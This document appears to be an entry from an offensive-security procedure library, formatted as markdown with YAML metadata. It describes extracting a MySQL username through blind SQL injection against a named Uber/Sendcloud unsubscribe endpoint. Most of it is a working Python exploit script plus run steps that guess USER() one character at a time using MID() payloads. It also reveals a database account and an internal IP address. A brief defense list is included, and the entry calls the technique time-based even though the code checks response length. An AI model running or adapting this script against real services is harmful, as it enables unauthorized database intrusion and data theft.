---
id: proc-uber-sqli-extract-001
tags:
  - sqli
  - blind-sqli
  - exfiltration
  - mysql
type: procedure
tools:
  - '[[tools/Python-Requests-Library]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/python-blind-sqli-dump-user]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:05.136Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Extract-MySQL-User-via-Blind-SQL-Injection

## Summary

This procedure exploits a confirmed time-based blind SQL injection to extract the MySQL USER() function output character by character, disclosing database username and host information without relying on error messages or direct output.

## Description

Building on a vulnerable user_id parameter in a base64-encoded JSON payload, this uses conditional payloads with MID() to guess each character position in USER(). For each position (up to 30), it iterates over possible characters (digits, letters, symbols), sends requests, and checks response length (>0 indicates match). In the Uber/Sendcloud case, this reveals 'sendcloud_w@10.9.79.210' and database name 'sendcloud', enabling potential further data access.

## Requirements

1. Confirmed SQLi vulnerability from prior testing
2. Python 3 environment with requests, json, base64, and urllib libraries
3. Target endpoint URL (e.g., http://sctrack.email.uber.com.cn/track/unsubscribe.do)
4. List of possible characters for guessing (e.g., digits + common symbols)

## Defense

Defensive measures and detection strategies:

- Parameterize all SQL queries to prevent injection
- Implement input validation stripping SQL functions like MID, USER
- Monitor for high-volume requests with encoded payloads or unusual patterns
- Use database activity logging to detect anomalous queries like SLEEP or MID
- Deploy intrusion detection for timing-based anomalies

## Objectives

1. Extract sensitive database metadata (username, host)
2. Demonstrate feasibility of blind data exfiltration
3. Lay groundwork for broader database enumeration

## Instructions

### Step 1: Prepare Payload Script

**Context**: Set up the base payload and character set for iteration.

**Command** ([[commands/python-blind-sqli-dump-user]]):
```bash
import json
import string
import requests
from urllib.parse import quote
from base64 import b64encode

base = string.digits + '\_-@.'
payload = {"user_id": 5755, "receiver": "blog.orange.tw"}

for l in range(0, 30):
    for i in 'i'+base:
        payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#" % (l+1, i)
        new_payload = json.dumps(payload)
        new_payload = b64encode(new_payload.encode()).decode()
        r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=' + quote(new_payload))
        if len(r.content) > 0:
            print(i, end='')
            break
    print()
```

> Save as sqli_dump.py; the script modifies user_id, encodes, sends, and prints matches.

### Step 2: Execute Extraction

**Context**: Run the script to dump the USER() string.

**Command** ([[commands/python-blind-sqli-dump-user]]):
```bash
python sqli_dump.py
```

> Script outputs characters sequentially; interruptions may require resuming from last position.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/python-blind-sqli-dump-user]]

## Tools Used

- [[tools/Python-Requests-Library]]

## Tags

- blind-sqli
- exfiltration
